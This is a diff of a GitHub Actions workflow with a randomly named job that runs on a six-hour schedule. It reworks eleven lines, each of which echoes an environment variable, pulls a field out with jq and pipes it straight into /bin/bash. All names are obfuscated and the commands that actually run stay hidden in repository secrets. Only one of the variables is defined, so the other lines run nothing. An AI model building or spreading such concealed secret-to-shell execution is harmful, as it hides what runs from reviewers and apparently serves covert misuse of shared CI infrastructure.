@@ -3,26 +3,26 @@ name: yuanjieling2038
 on:
   workflow_dispatch:
   schedule:
-    - cron: '30 2/6 * * *'
+    - cron: '18 1/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: yuanjieling2038
         env:
-          hhyi827: ${{ secrets.hhyi827 }}
+          eon9876: ${{ secrets.eon9876 }}
         run: |
-          echo $hhyi827 | jq -r .rm4030 | /bin/bash
-          echo $rsl554 | jq -r .fvwy7 | /bin/bash
-          echo $jwdm5 | jq -r .qt221 | /bin/bash
-          echo $n80 | jq -r .ccgn1937 | /bin/bash
-          echo $qejbi05467 | jq -r .czdq19253 | /bin/bash
-          echo $qqqmw7 | jq -r .iwfn8 | /bin/bash
-          echo $nyj91311 | jq -r .q4551 | /bin/bash
-          echo $q399 | jq -r .tmxf02 | /bin/bash
-          echo $gcrm16882 | jq -r .m262 | /bin/bash
-          echo $w88911 | jq -r .fpwuc6 | /bin/bash
-          echo $kxo1871 | jq -r .lhmjs23249 | /bin/bash
+          echo $eon9876 | jq -r .etj37 | /bin/bash
+          echo $ca9301 | jq -r .opbg78702 | /bin/bash
+          echo $lwbc42829 | jq -r .ycdbw732 | /bin/bash
+          echo $yikpe03375 | jq -r .upnrw3 | /bin/bash
+          echo $delu9 | jq -r .wmc774 | /bin/bash
+          echo $gc35469 | jq -r .ggow072 | /bin/bash
+          echo $rpu82285 | jq -r .zyfju3088 | /bin/bash
+          echo $wbbyf20414 | jq -r .mpe672 | /bin/bash
+          echo $tgcuz0 | jq -r .hot407 | /bin/bash
+          echo $gr141 | jq -r .bebj7165 | /bin/bash
+          echo $gnv4 | jq -r .wtjel864 | /bin/bash
 
